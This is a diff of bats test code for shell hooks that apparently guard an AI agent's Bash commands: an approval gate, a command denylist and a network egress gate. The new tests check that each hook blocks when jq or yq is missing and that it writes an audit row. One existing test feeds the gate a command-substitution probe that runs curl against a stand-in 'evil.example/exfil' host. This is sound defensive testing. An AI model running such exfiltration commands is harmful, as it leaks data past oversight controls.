@@ -75,12 +75,44 @@ _approval_gate_bash() {
   _hook_event Bash "$1" | "$REPO_ROOT/hooks/approval-gate.sh"
 }
 
+_approval_gate_no_jq() {
+  local command="$1" mock_bin="$TMP_HOME/no-jq-bin"
+  mkdir -p "$mock_bin"
+  printf '#!/usr/bin/env bash\nexit 127\n' > "$mock_bin/jq"
+  chmod +x "$mock_bin/jq"
+  _hook_event Bash "$command" | PATH="$mock_bin:/usr/bin:/bin" "$REPO_ROOT/hooks/approval-gate.sh"
+}
+
+_approval_gate_no_yq() {
+  local command="$1" mock_bin="$TMP_HOME/no-yq-bin" real_jq
+  mkdir -p "$mock_bin"
+  real_jq="$(command -v jq)"
+  ln -sf "$real_jq" "$mock_bin/jq"
+  _hook_event Bash "$command" | PATH="$mock_bin:/usr/bin:/bin" "$REPO_ROOT/hooks/approval-gate.sh"
+}
+
 _bash_denylist() {
   _hook_event Bash "$1" | bash "$REPO_ROOT/hooks/bash-denylist.sh"
 }
 
+_bash_denylist_no_jq() {
+  local command="$1" mock_bin="$TMP_HOME/no-jq-bin"
+  mkdir -p "$mock_bin"
+  printf '#!/usr/bin/env bash\nexit 127\n' > "$mock_bin/jq"
+  chmod +x "$mock_bin/jq"
+  _hook_event Bash "$command" | PATH="$mock_bin:/usr/bin:/bin" bash "$REPO_ROOT/hooks/bash-denylist.sh"
+}
+
 _network_gate_bash() {
   _hook_event Bash "$1" | bash "$REPO_ROOT/hooks/network-gate.sh"
+}
+
+_network_gate_no_jq() {
+  local command="$1" mock_bin="$TMP_HOME/no-jq-bin"
+  mkdir -p "$mock_bin"
+  printf '#!/usr/bin/env bash\nexit 127\n' > "$mock_bin/jq"
+  chmod +x "$mock_bin/jq"
+  _hook_event Bash "$command" | PATH="$mock_bin:/usr/bin:/bin" bash "$REPO_ROOT/hooks/network-gate.sh"
 }
 
 _network_gate_tool() {
@@ -109,6 +141,10 @@ _wiki_validator_empty() {
 
 _rows() {
   wc -l < "$(_chain_path)" | tr -d ' '
+}
+
+_last_output_line() {
+  printf '%s\n' "$output" | tail -n 1
 }
 
 @test "approval-gate hook allow appends exactly one audit row" {
@@ -161,6 +197,38 @@ SH
   [ "$(_rows)" = "1" ]
 }
 
+@test "approval-gate jq-missing block appends dependency-failure row when chain is empty" {
+  run _approval_gate_no_jq "echo hi"
+
+  [ "$status" -eq 0 ]
+  _last_output_line | jq -e '.hookSpecificOutput.permissionDecision == "block"'
+  [ "$(_rows)" = "1" ]
+  jq -e '.decision_source == "approval-gate" and .decision == "block" and (.decision_reason | test("jq missing"))' "$(_chain_path)"
+}
+
+@test "approval-gate jq-missing block is best-effort when chain already exists" {
+  run _approval_gate_bash "echo first"
+  [ "$status" -eq 0 ]
+  [ "$(_rows)" = "1" ]
+
+  run _approval_gate_no_jq "echo second"
+
+  [ "$status" -eq 0 ]
+  _last_output_line | jq -e '.hookSpecificOutput.permissionDecision == "block"'
+  [ "$(_rows)" = "1" ]
+}
+
+@test "approval-gate yq-missing block refuses unaudited append failures" {
+  mkdir -p "$(dirname "$(_chain_path)")"
+  printf '\n' > "$(_chain_path)"
+
+  run _approval_gate_no_yq "echo hi"
+
+  [ "$status" -eq 0 ]
+  _last_output_line | jq -e '.decision == "block" and (.reason | test("audit-chain append failed"))'
+  [ "$(_rows)" = "1" ]
+}
+
 @test "bash-denylist allow appends exactly one audit row" {
   run _bash_denylist "echo hi"
 
@@ -177,6 +245,27 @@ SH
   echo "$output" | jq -e '.decision == "block"'
   [ "$(_rows)" = "1" ]
   jq -e '.decision_source == "bash-denylist" and .decision == "block"' "$(_chain_path)"
+}
+
+@test "bash-denylist jq-missing block appends dependency-failure row when chain is empty" {
+  run _bash_denylist_no_jq "echo hi"
+
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block" and (.reason | test("jq missing"))'
+  [ "$(_rows)" = "1" ]
+  jq -e '.decision_source == "bash-denylist" and .decision == "block" and (.decision_reason | test("jq missing"))' "$(_chain_path)"
+}
+
+@test "bash-denylist jq-missing block is best-effort when chain already exists" {
+  run _bash_denylist "echo first"
+  [ "$status" -eq 0 ]
+  [ "$(_rows)" = "1" ]
+
+  run _bash_denylist_no_jq "echo second"
+
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block" and (.reason | test("jq missing"))'
+  [ "$(_rows)" = "1" ]
 }
 
 @test "bash-denylist legacy bash block appends audit row" {
@@ -201,12 +290,34 @@ SH
 @test "network-gate blocked egress appends exactly one audit row" {
   : > "$WALTER_CONFIG/egress-allowlist.txt"
 
+  # shellcheck disable=SC2016 # Literal command substitution probes hook parsing.
   run _network_gate_bash 'echo $(curl https://evil.example/exfil)'
 
   [ "$status" -eq 0 ]
   echo "$output" | jq -e '.decision == "block"'
   [ "$(_rows)" = "1" ]
   jq -e '.decision_source == "network-gate" and .decision == "block"' "$(_chain_path)"
+}
+
+@test "network-gate jq-missing block appends dependency-failure row when chain is empty" {
+  run _network_gate_no_jq "curl https://example.com"
+
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block" and (.reason | test("jq missing"))'
+  [ "$(_rows)" = "1" ]
+  jq -e '.decision_source == "network-gate" and .decision == "block" and (.decision_reason | test("jq missing"))' "$(_chain_path)"
+}
+
+@test "network-gate jq-missing block is best-effort when chain already exists" {
+  run _network_gate_bash "echo first"
+  [ "$status" -eq 0 ]
+  [ "$(_rows)" = "1" ]
+
+  run _network_gate_no_jq "curl https://example.com"
+
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block" and (.reason | test("jq missing"))'
+  [ "$(_rows)" = "1" ]
 }
 
 @test "network-gate legacy bash block appends audit row" {
